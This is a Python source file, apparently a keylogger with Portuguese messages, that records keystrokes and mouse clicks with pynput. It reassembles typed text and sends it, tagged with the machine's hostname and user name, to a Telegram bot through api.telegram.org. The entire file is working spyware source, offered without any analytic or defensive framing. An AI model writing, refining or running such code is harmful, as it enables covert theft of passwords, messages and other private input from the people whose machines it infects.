from pynput.keyboard import Key, Listener
from pynput import mouse
from dotenv import load_dotenv

import requests
import telebot
import re
import getpass
import socket
import os

load_dotenv()

FULLLOG = ''
WORDS = ''

CHAR_MIN_TO_SEND = 5
CHAR_MAX_TO_SEND = 50

HEADER_MESSAGE = f"maquina: {socket.gethostname()}" + "\n" + f"user: {getpass.getuser()}"

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError(
        "BOT_TOKEN e CHAT_ID não foram encontrados. Verifique o arquivo .env."
    )

BOT = telebot.TeleBot(BOT_TOKEN)


def onPress(key):
    global WORDS
    global FULLLOG

    if key == Key.space:
        WORDS += ' '

    elif key == Key.backspace:
        WORDS = WORDS[:-1]
               
    elif key == Key.enter:
        FULLLOG += WORDS + '\n'

        messageFormated = formatMessage(FULLLOG)

        if len(messageFormated.strip()) > 0 and len(messageFormated) <= CHAR_MAX_TO_SEND:
            send(messageFormated)
            print(messageFormated)

        WORDS = ''
        FULLLOG = ''

    else:
        if (hasattr(key, 'char') and key.char) or key == Key.caps_lock:
            char = str(key)
            char = char.replace("'", "")
            WORDS += char
    
def send(message):

    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

    payload = {
        'chat_id': CHAT_ID,
        'text': HEADER_MESSAGE + "\n" + f"message: {message}",
    }

    response = requests.post(url, data=payload)
    return response.json()
    
def onClick(x, y, button, pressed):
    global FULLLOG
    global WORDS

    if len(WORDS) > 0 and pressed:
        messageFormated = formatMessage(FULLLOG + WORDS)

        if len(messageFormated) >= CHAR_MIN_TO_SEND:
            FULLLOG += WORDS + '\n'

            if len(messageFormated) <= CHAR_MAX_TO_SEND:
                send(messageFormated)
                print(messageFormated)

            WORDS = ''
            FULLLOG = ''
    else:
        pass

def formatMessage(message):
    regex = r"Key\.caps_lock(.*?)Key\.caps_lock"
    
    return re.sub(
    regex,
    lambda m: m.group(1).upper(),
    message
    )
    
def main():
    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=onClick) as m_listener:
        k_listener.join()
        m_listener.join()

if __name__ == '__main__':
    main()